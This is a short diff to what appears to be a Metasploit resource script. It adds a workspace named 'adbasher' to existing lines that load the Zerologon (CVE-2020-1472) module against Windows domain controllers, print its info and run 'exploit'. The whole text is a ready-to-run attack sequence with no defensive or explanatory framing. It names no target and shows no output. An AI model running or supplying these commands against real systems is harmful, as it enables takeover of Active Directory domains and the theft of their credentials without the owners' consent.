@@ -1,3 +1,4 @@
+workspace -a adbasher
 use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
 info
 exploit
